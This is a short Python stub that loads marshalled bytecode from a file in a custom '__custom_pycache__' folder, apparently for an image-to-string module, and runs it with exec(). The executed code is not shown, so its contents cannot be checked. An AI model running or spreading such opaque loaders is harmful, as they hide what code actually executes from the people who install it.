
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'ImageToString_01430a089e59445bbf814dd68b8ce458.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
